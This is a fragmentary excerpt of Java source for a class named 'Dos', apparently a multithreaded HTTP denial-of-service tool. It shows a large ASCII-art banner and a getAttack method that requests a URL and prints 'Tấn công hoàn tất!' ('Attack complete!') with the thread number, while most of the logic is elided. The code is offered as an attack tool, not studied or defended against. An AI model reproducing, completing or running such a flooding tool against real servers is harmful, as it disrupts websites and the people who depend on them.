...
public class Dos implements Runnable {
 ...
 | |\  | (_| | |_| | |_| |  __/ | | | | |\  | (_| | (_) | (__  | |_) | (_| | (_) | | |____| | | | (_| | |_| |
 |_| \_|\__, |\__,_|\__, |\___|_| |_| |_| \_|\__, |\___/ \___| |____/ \__,_|\___/   \_____|_| |_|\__,_|\__,_|
         __/ |       __/ |                    __/ |                                                          
        |___/       |___/                    |___/                                                           
");
    ...
    private void getAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println("Tấn công hoàn tất!: " + responseCode + " Luồng: " + this.seq);
    }
